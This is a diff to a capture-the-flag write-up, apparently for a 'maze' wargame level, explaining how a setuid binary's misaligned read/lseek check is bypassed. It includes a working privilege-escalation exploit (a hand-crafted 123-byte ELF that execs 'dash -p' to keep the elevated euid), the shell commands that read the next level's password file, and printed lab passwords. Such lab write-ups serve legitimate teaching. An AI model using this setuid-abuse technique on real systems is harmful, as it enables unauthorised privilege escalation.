@@ -260,11 +260,79 @@ cat /etc/maze_pass/maze4   # MB583SjyFZ
 
 ---
 
-## Level 4 → maze5 (in progress)
+## Level 4 → maze5 (SOLVED 2026-11-23)
 
-- **Account:** `maze4`.
+- **Account:** `maze4` (initial password `MB583SjyFZ`).
 - **Goal:** get the password for `maze5` from `/maze/maze4`.
-- **Status:** in progress (2026-11-22). The `maze4` binary is downloaded to
-  `tools/maze/l4/maze4`; static analysis (file / readelf / objdump, then a `maze5`-login
-  verification via `ssh -p 2225`) is the next step. Recorded here as the continuation target;
-  the full educational write-up for this level is added once it is solved and committed.
+- **Technique:** the binary is a stat-then-exec gate. Its two reads and the lseek are
+  misaligned with the data they check — the "size" used by `lseek` is actually read back
+  out of the first-read buffer (the file's own bytes 28..31), and the compared dword comes
+  from the second read at `offset+12`. A hand-built 123-byte ELF passes the gate for free
+  (ELF header bytes 7,8 are 0 → product 0; the program header's `p_paddr` — ignored by the
+  kernel — is the compared dword → 0 == 0), and because `/maze/maze4` is setuid maze5 and
+  the ELF execs `dash -p`, the elevated euid survives to a `cat` of the password file.
+
+### Step-by-step discovery and crafting
+
+1. **Read the binary.** `/maze/maze4` is 16392 bytes, i386, with debug info, mode
+   `4750 maze5:maze4`. `objdump -d -M intel` reconstructs main:
+
+   ```c
+   fd = open(argv[1], O_RDONLY);
+   stat(argv[1], &st);
+   read(fd, bufA, 52);                    /* bufA = ebp-0x38 */
+   lseek(fd, *(int *)(bufA + 28), SEEK_SET);   /* NOT st_size! */
+   read(fd, bufB, 32);                    /* bufB = ebp-0xb0 */
+   if (*(int *)(bufB + 12) == (unsigned char)bufA[7] * (unsigned char)bufA[8]
+       && st.st_size <= 123) {
+       puts("valid file, executing");
+       execv(argv[1], argv);
+   }
+   ```
+
+2. **Pin the operands with gdb** (break `0x8049318`, the compare): `[ebp-0x31]` = bufA+7
+   = file byte 7, `[ebp-0x30]` = file byte 8, `[ebp-0xa4]` = bufB+12, and — the trap —
+   `[ebp-0x1c]` (the lseek argument) is **bufA+28**, i.e. the offset comes from the file's
+   own bytes 28..31, not from `st_size`. Verify against a known file (`"#!/bin/sh..."`
+   → factors `s*h` = 115·104 = 11960).
+
+3. **First attempt — a shell script.** The gate is satisfiable by a script: hide the magic
+   dword and the offset dword inside the line-2 comment (`tools/maze/l4/mkpay.py`, 71
+   bytes). It prints `valid file, executing` — but `/tmp` on this lab is a **tmpfs mounted
+   `nosuid`** (the setuid bit never applies there), and even from `/run/screen` (root ext4,
+   suid-friendly) `dash` without `-p` drops the inherited euid maze5 back to maze4 for its
+   children. `id` inside the script: `uid=15004 euid=15004`.
+
+4. **The winning payload — a 123-byte hand-built ELF** (`tools/maze/l4/tinel.py`):
+   - an ELF passes the arithmetic for free: bytes 7,8 are `EI_OSABI`/`EI_ABIVERSION`
+     = 0,0 → product 0; `e_phoff` = 52 → the lseek offset; the second read (bytes
+     52..83) is the program header, and `phdr+12` = `p_paddr`, which the kernel ignores —
+     set **p_paddr = 0** and the compare is 0 == 0.
+   - size 52+32+26 = 123 ≤ 123 exactly.
+   - strings `sh\0-p\0` hide in `e_ident[9..14]` (the EI_PAD area).
+   - the 26-byte stub at file offset 84 (vaddr 0x08048000+84) runs
+     `execve("sh", {"sh","-p",NULL}, NULL)` — `sh` is a dash copy in the cwd, and `-p`
+     makes dash **keep** the elevated euid.
+
+   ```sh
+   mkdir -p /run/screen/l4 && cd /run/screen/l4   # /tmp is nosuid!
+   cp /bin/sh ./sh
+   python3 tinel.py          # writes ./tiny (123 bytes)
+   chmod 755 tiny sh
+   echo "id" | /maze/maze4 tiny
+   # valid file, executing
+   # uid=15004(maze4) gid=15004(maze4) euid=15005(maze5)
+   echo "cat /etc/maze_pass/maze5" | /maze/maze4 tiny
+   # valid file, executing
+   # A3846ZPJuH
+   ```
+
+5. **Why it works end to end:** `/maze/maze4` is setuid maze5, so the kernel gives the
+   process `euid=15005`; `execv` of our ELF keeps that euid; the stub re-execs dash `-p`,
+   which preserves it; `cat` then reads `/etc/maze_pass/maze5` (mode 400 maze5).
+
+- **Password for maze5:** `A3846ZPJuH`
+- **Verification:** confirmed by SSH login as `maze5` (uid 15005; password file matches).
+- **Recording:** `recordings/maze/L4.cast`.
+- **Gotcha worth remembering:** `/tmp` is `nosuid` on the maze lab — do setuid work under
+  `/run/screen` (root filesystem).
